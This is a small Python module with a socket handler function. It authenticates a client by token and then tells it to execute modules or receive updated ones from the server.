import handler.socket_handler as socket_handler

def online (token, client_socket, content):
    result = False
    try:
        if client_socket:
            if content == 'Hello':
                client_socket.send("Hello".encode('utf-8'))
                response = client_socket.recv(1024).decode('utf-8')
                if response == token:
                    client_socket.send("Authorized".encode('utf-8'))
                else:
                    client_socket.send("Unauthorized".encode('utf-8'))
                result = response == token
            elif content == 'exec_modules':
                client_socket.send("exec_modules".encode('utf-8'))
                response = client_socket.recv(1048).decode('utf-8')
                if response == 'Success':
                    result = True
            elif content == 'update_modules':
                client_socket.send("update_modules".encode('utf-8'))
                socket_handler.send_modules_to_client(client_socket)
                response = client_socket.recv(1024).decode('utf-8')
                if response == 'Success':
                    result = True
            client_socket.close()
            return result
        else :
            return False
    except:
        pass

